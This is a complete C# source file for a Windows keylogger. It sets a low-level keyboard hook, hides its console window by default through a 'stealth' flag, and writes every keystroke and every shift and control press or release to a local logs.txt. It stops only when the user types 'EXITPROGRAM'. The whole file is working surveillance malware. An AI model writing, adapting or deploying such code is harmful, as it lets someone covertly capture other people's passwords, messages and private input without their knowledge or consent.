using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

namespace Program
{
    class Program
    {
		private static int stealth = 0;		// Change this only for troubleshooting (0: hidden, 1: shown)
		
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
		private static int WM_KEYUP = 0x0101;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
		
		
		private static bool lShift = false;
		private static bool rShift = false;
		private static bool lCtrl = false;
		private static bool rCtrl = false;
		
        static void Main(string[] args)
        {
			File.Delete(@"logs.txt");		// Delete the old file before starting
			
			// Hide Window
			var handle = GetConsoleWindow();
			ShowWindow(handle, stealth);	
			
			
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
				//Keydown
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if(((Keys)vkCode).ToString() == "OemPeriod")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write(".");
                    output.Close();
                }
				if (((Keys)vkCode).ToString() == "Tab")
				{
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write(" TAB ");
                    output.Close();
				}
				if (((Keys)vkCode).ToString() == "Space")
				{
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write(" SPACE ");
                    output.Close();
				}
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write(",");
                    output.Close();
                }
				else if(((Keys)vkCode).ToString() == "LShiftKey")
                {
					if (lShift == false)
					{
						StreamWriter output = new StreamWriter(@"logs.txt", true);
						output.Write(" LShiftDown ");
						output.Close();
					}
					lShift = true;
                }
				else if(((Keys)vkCode).ToString() == "RShiftKey")
                {
					if (rShift == false)
					{
						StreamWriter output = new StreamWriter(@"logs.txt", true);
						output.Write(" RShiftDown ");
						output.Close();
					}
					rShift = true;
                }
                else if(((Keys)vkCode).ToString() == "LControlKey")
                {
					if (lCtrl == false)
					{
						StreamWriter output = new StreamWriter(@"logs.txt", true);
						output.Write(" LControlDown ");
						output.Close();
					}
					lCtrl = true;
                }
                else if(((Keys)vkCode).ToString() == "RControlKey" && rCtrl == false)
                {
					if (rCtrl == false)
					{
						StreamWriter output = new StreamWriter(@"logs.txt", true);
						output.Write(" RControlDown ");
						output.Close();
					}
					rCtrl = true;
                }
				else if(((Keys)vkCode).ToString() == "D1" || ((Keys)vkCode).ToString() == "NumPad1")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write("1");
                    output.Close();
                }
				else if(((Keys)vkCode).ToString() == "D2" || ((Keys)vkCode).ToString() == "NumPad2")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write("2");
                    output.Close();
                }
				else if(((Keys)vkCode).ToString() == "D3" || ((Keys)vkCode).ToString() == "NumPad3")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write("3");
                    output.Close();
                }
				else if(((Keys)vkCode).ToString() == "D4" || ((Keys)vkCode).ToString() == "NumPad4")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write("4");
                    output.Close();
                }
				else if(((Keys)vkCode).ToString() == "D5" || ((Keys)vkCode).ToString() == "NumPad5")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write("5");
                    output.Close();
                }
				else if(((Keys)vkCode).ToString() == "D6" || ((Keys)vkCode).ToString() == "NumPad6")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write("6");
                    output.Close();
                }
				else if(((Keys)vkCode).ToString() == "D7" || ((Keys)vkCode).ToString() == "NumPad7")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write("7");
                    output.Close();
                }
				else if(((Keys)vkCode).ToString() == "D8" || ((Keys)vkCode).ToString() == "NumPad8")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write("8");
                    output.Close();
                }
				else if(((Keys)vkCode).ToString() == "D9" || ((Keys)vkCode).ToString() == "NumPad9")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write("9");
                    output.Close();
                }
				else if(((Keys)vkCode).ToString() == "D0" || ((Keys)vkCode).ToString() == "NumPad0")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write("0");
                    output.Close();
                }
                else
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write((Keys)vkCode);
                    output.Close();
                }
				
				exitProgram(((Keys)vkCode).ToString());	//detect a specific sequence of key strokes to end program
            }
			
				// Keyup
			if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if(((Keys)vkCode).ToString() == "LShiftKey")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write(" LShiftUp ");
                    output.Close();
					lShift = false;
                }
                else if(((Keys)vkCode).ToString() == "RShiftKey")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write(" RShiftUp ");
                    output.Close();
					rShift = false;
                }
                else if(((Keys)vkCode).ToString() == "LControlKey")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write(" LControlUp ");
                    output.Close();
					lCtrl = false;
                }
                else if(((Keys)vkCode).ToString() == "RControlKey")
                {
                    StreamWriter output = new StreamWriter(@"logs.txt", true);
                    output.Write(" RControlUp ");
                    output.Close();
					rCtrl = false;
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
		}
		
		
		private static int codePos = 0;
		private static string code = "EXITPROGRAM";
		
		// This function detects if the user is typing the a sequence of key strokes
		// in the order of "code"
		// When this is typed the program will exit
		private static void exitProgram(string letter)
		{
			if (letter[0] == code[codePos])
				codePos += 1;
			else
				codePos = 0;
			
			if (codePos == 11)
			{
				var handle = GetConsoleWindow();
				ShowWindow(handle, 1);
				Console.WriteLine("Program Exited");
			}
		}
		

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
		
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}